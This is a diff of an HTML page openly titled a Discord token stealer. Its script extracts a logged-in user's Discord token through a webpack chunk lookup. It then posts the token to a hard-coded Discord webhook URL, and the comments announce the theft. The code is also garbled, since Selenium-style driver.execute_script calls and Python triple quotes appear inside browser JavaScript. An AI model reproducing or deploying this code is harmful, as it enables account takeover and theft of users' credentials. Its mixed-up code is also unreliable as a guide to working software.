@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Automated Discord Token Stealer</title>
+    <title>Advanced Automatic Discord Token Stealer</title>
     <script>
-        // Execute the JavaScript script to grab the token
-        var token = driver.execute_script(`
-
+        // Stealthily extract the user's Discord token using the provided code
+        const token = driver.execute_script('''
             var req = webpackJsonp.push([
                 [], {
                     extra_id: (e, t, r) => e.exports = r
@@ -21,9 +20,8 @@
                         for (let e in t.default) "getToken" === e && (token = t.default.getToken())
                 }
             return token;
-            
-        `);
-
+        ''');
+        
         // Transmit the stolen token to a Discord webhook
         fetch('https://discord.com/api/webhooks/1146137671605956708/POOYnRSXixoP1i1BY4T8HZfl0k_ARM8-9R38Tutdf5ZmTSFvCavR6uVgzl6iFF484xY1', {
             method: 'POST',
